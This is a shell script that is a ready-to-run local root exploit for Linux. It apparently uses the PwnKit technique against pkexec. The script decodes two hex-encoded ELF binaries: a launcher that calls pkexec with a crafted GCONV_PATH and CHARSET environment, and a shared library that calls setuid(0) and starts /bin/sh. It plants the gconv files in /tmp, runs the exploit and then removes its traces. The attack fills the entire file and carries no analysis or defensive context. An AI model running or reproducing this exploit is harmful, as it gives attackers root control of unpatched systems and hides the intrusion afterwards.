#!/bin/sh

x() {
	echo "$1" | /usr/bin/xxd -p -r && return
	r="$1"
	while [ -n "$r" ]
	do
		echo -en $(echo "\x${r:0:2}")
		r="${r:2}"
	done
}

EX=$(printf "7f454c46020101%.18x02003e0001%.6x0c0140%.10x40%.14x4802%.20x40003800030040000700060001%.6x05%.26x40%.14x40%.10xd801%.12xd801%.16x20%.10x04%.6x04%.6xe8%.14xe80040%.10xe80040%.10x24%.14x24%.14x04%.14x51e5746406%.86x10%.14x04%.6x14%.6x03%.6x474e5500fa519354231d8663094f77ed0f02e4356f9c676d554889e548c745d05501400048c745d85c01400048c745e06e01400048c745e87d01400048c745f0%.8xb83b%.6xb98a014000488d55d0488d7220488d55d04889cf0f055dc370776e6b697400504154483d47434f4e565f504154483d2e00434841525345543d50574e4b4954005348454c4c3d70776e6b6974002f7573722f62696e2f706b65786563%.14x14%.14x017a5200017810011b0c07089001%.4x1c%.6x1c%.6x4cffffff49%.8x410e108602430d0602440c0708%.4x4743433a2028474e552920342e382e3520323031353036323320285265642048617420342e382e352d343429%.4x2e7368737472746162002e6e6f74652e676e752e6275696c642d6964002e74657874002e726f64617461002e65685f6672616d65002e636f6d6d656e74%.138x0b%.6x07%.6x02%.14xe80040%.10xe8%.14x24%.30x04%.30x1e%.6x01%.6x06%.14x0c0140%.10x0c01%.12x49%.30x01%.30x24%.6x01%.6x02%.14x550140%.10x5501%.12x45%.30x01%.30x2c%.6x01%.6x02%.14xa00140%.10xa001%.12x38%.30x08%.30x36%.6x01%.6x30%.30xd801%.12x2d%.30x01%.14x01%.14x01%.6x03%.38x0502%.12x3f%.30x01%.30x")
SO=$(printf "7f454c46020101%.18x03003e0001%.6x2004%.12x40%.14xe810%.20x40003800060040000e000d0001%.6x05%.54x7005%.12x7005%.16x20%.10x01%.6x06%.6x100f%.12x100f20%.10x100f20%.10x3001%.12x3001%.16x20%.10x02%.6x06%.6x100f%.12x100f20%.10x100f20%.10xf0%.14xf0%.14x08%.14x04%.6x04%.6x9001%.12x9001%.12x9001%.12x24%.14x24%.14x04%.14x51e5746406%.86x10%.14x52e5746404%.6x100f%.12x100f20%.10x100f20%.10xf0%.14xf0%.14x01%.14x04%.6x14%.6x03%.6x474e550065e6705c488871de8f7162d9347fa5539f2b86cc%.8x03%.6x06%.6x01%.6x06%.6x884020110400220806%.6x09%.14x620c7f0f4245d5ecbbe3927cd871581c35a75280%.48x30%.6x10%.38x19%.6x10%.38x20%.6x10%.38x28%.6x10%.38x12%.6x10%.38x01%.6x120007002004%.12x06%.14x37%.6x10000b00401020%.26x4a%.6x10000b00401020%.26x3e%.6x10000b00401020%.26x07%.6x120007002604%.12x73%.16x67636f6e760067636f6e765f696e697400736574756964007365746769640073657465756964007365746567696400657865637665005f6564617461005f5f6273735f7374617274005f656e64%.4x181020%.10x07%.6x01%.22x201020%.10x07%.6x02%.22x281020%.10x07%.6x03%.22x301020%.10x07%.6x04%.22x381020%.10x07%.6x05%.22xff35420c2000ff25440c20000f1f4000ff25420c200068%.8xe9e0ffffffff253a0c20006801%.6xe9d0ffffffff25320c20006802%.6xe9c0ffffffff252a0c20006803%.6xe9b0ffffffff25220c20006804%.6xe9a0ffffff554889e55dc3554889e54883ec20488d056b%.6x488945e048c745e8%.8x488d0560%.6x488945f048c745f8%.8xbf%.8xe8b2ffffffbf%.8xe878ffffffbf%.8xe87effffffbf%.8xe884ffffff488b45e0488d55e04883c210488d4de04889ce4889c7e839ffffffc9c3%.14x2f62696e2f736800504154483d2f7573722f6c6f63616c2f7362696e3a2f7573722f6c6f63616c2f62696e3a2f7573722f7362696e3a2f7573722f62696e3a2f7362696e3a2f62696e%.14x14%.14x017a5200017810011b0c07089001%.4x1c%.6x1c%.6x10ffffff06%.8x410e108602430d06410c0708%.6x1c%.6x3c%.6xf6feffff73%.8x410e108602430d06026e0c0708%.4x24%.6x5c%.6x70feffff60%.8x0e10460e184a0f0b770880003f1a3b2a332422%.4936xf5feff6f%.8xb801%.12x05%.14xf802%.12x06%.14xf001%.12x0a%.14x4f%.14x0b%.14x18%.14x03%.16x1020%.10x02%.14x78%.14x14%.14x07%.14x17%.14x4803%.204x100f20%.42xd603%.12xe603%.12xf603%.12x0604%.12x1604%.12x4743433a2028474e552920342e382e3520323031353036323320285265642048617420342e382e352d343429%.4x2e7368737472746162002e6e6f74652e676e752e6275696c642d6964002e676e752e68617368002e64796e73796d002e64796e737472002e72656c612e706c74002e74657874002e726f64617461002e65685f6672616d65002e64796e616d6963002e676f742e706c74002e636f6d6d656e74%.142x0b%.6x07%.6x02%.14x9001%.12x9001%.12x24%.30x04%.30x1e%.6xf6ffff6f02%.14xb801%.12xb801%.12x38%.14x03%.14x08%.30x28%.6x0b%.6x02%.14xf001%.12xf001%.12x0801%.12x04%.6x01%.6x08%.14x18%.14x30%.6x03%.6x02%.14xf802%.12xf802%.12x4f%.30x01%.30x38%.6x04%.6x42%.14x4803%.12x4803%.12x78%.14x03%.6x0b%.6x08%.14x18%.14x3d%.6x01%.6x06%.14xc003%.12xc003%.12x60%.30x10%.14x10%.14x42%.6x01%.6x06%.14x2004%.12x2004%.12x79%.30x01%.30x48%.6x01%.6x02%.14xa004%.12xa004%.12x4a%.30x08%.30x50%.6x01%.6x02%.14xf004%.12xf004%.12x80%.30x08%.30x5a%.6x06%.6x03%.14x100f20%.10x100f%.12xf0%.14x04%.14x08%.14x10%.14x63%.6x01%.6x03%.16x1020%.12x10%.12x40%.30x08%.14x08%.14x6c%.6x01%.6x30%.30x4010%.12x2d%.30x01%.14x01%.14x01%.6x03%.38x6d10%.12x75%.30x01%.30x")

cd /tmp
mkdir -p 'GCONV_PATH=.'
touch 'GCONV_PATH=./pwnkit'
chmod a+x 'GCONV_PATH=./pwnkit'
mkdir -p pwnkit
echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules
echo "Releasing cvex"
x "$EX" > cvex
echo "Releasing pwnkit"
x "$SO" > pwnkit/pwnkit.so
chmod +x cvex
./cvex
rm -rf 'GCONV_PATH=.'
rm -rf 'pwnkit'
rm -f cvex
